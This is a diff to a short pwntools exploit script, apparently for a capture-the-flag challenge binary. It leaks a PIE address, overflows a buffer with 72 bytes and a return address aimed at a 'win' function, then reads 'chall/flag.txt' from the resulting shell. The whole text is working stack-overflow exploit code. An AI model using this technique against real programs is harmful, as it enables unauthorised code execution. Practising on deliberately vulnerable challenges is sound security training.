@@ -1,8 +1,9 @@
 #!/usr/bin/env python3
 
 from pwn import *
+from pwn import p64
 
-context.terminal = 	["tmux", "splitw", "-h"]
+context.terminal = ["tmux", "splitw", "-h"]
 
 path = "./app"
 exe = ELF(path)
@@ -26,17 +27,14 @@ info(f"{hex(pie_leak) = }")
 
 exe.address = pie_leak - exe.symbols["main"] - 24
 info(f"{hex(exe.address) = }")
-info(f"{hex(exe.symbols['hospital']) = }")
-
-ret = exe.address + 0x1016
+info(f"{hex(exe.symbols['win']) = }")
 
 payload = 72 * b"A"
-payload += p64(ret)
-payload += p64(exe.symbols['hospital'])
+payload += p64(exe.symbols['win'])
 io.sendlineafter(b"already.", payload)
 
 io.recvuntil(b"?!\n")
 io.sendline(b"cat chall/flag.txt")
-print(io.recvline())
+print(io.recvline().strip().decode())
 io.close()
 # io.interactive()
